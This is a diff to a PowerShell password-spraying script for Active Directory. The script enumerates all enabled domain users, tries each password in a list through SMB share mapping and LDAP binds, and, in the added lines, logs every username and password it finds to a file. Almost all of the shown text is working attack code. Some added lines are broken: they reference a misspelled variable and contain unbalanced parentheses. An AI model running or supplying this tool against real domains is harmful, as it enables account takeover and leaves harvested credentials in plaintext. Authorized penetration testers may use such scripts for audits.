@@ -1,13 +1,13 @@
 ﻿Param
  (
-    $Domain = 'trd.net',
+    $Domain,
     $AuthType = 'NTLM',
     [switch]$OnlyShowAuccess = $True,
     [switch]$EnableJitter,
     [switch]$AutoTune,
     [string]$DomainController,
     $PasswordFile,
-    $PassowrdSprayResultsFile
+    $PasswordSprayResultsFile
  )
 
 IF ($DomainController)
@@ -48,6 +48,19 @@ IF ($PasswordFile)
 [array]$UserAccountArray = Get-ADUser -Filter * -Server $DomainDC | Where { $_.Enabled -eq $True} 
 $UserAccountArray = $UserAccountArray | Sort-Object SamAccountName
 
+$PWSprayUserFileCheck = Read-Host "Password Spray Output file exists ($PasswordSprayResultsFile). Overwrite? (Y/N)?"
+IF ( ($PWSprayUserFileCheck -eq 'N') -OR ($PWSprayUserFileCheck -eq 'No') )
+ {
+    $PWSprayFileArray = $PasswordSprayResultsFile -Split '\\'
+    $PWSprayFileNameArrayCount = $PWSprayFileArray.count -1
+    $PWSprayFileNameArrayText = ($PWSprayFileArray[$PWSprayFileNameArrayCount] -split '\.')[0]
+    $PWSprayFileNameText = $PWSprayFileNameArrayText + '-' + $(Get-Random -min 100 -max 999)
+    $PWSprayFileNewArrayUpdated = $PasswordSprayResultsFile.Replace($PWSprayFileNameArrayText, $PWSprayFileNameText)
+    $PasswordSprayResultsFile = $PWSprayFileNewArrayUpdated
+ }
+
+"Password Spray Results for $Domain using $AuthType " | Out-File  $PassowrdSprayResultsFile
+
 Write-Host "Password Spraying the domain $Domain using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
 ForEach ($PasswordArrayItem in $PasswordArray)
  {
@@ -69,7 +82,10 @@ ForEach ($PasswordArrayItem in $PasswordArray)
                 $outputSMB = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
                 Remove-SmbMapping -RemotePath $RemotePath -Force
                 IF ($outputSMB.Status -eq 'Ok')
-                 { write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan }
+                 { 
+                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
+                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append   
+                 }
              }
             CATCH
              { write-verbose "Password is incorrect" }
@@ -82,7 +98,10 @@ ForEach ($PasswordArrayItem in $PasswordArray)
                 $outputDSDE = @()
                 $outputDSDE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
                 IF ($outputDSDE.distinguishedName)
-                 { write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan }
+                 { 
+                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
+                    $($UserAccountArrayItem.SamAccountName + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append 
+                 }
              }
             CATCH 
              { write-verbose "Password is incorrect" }
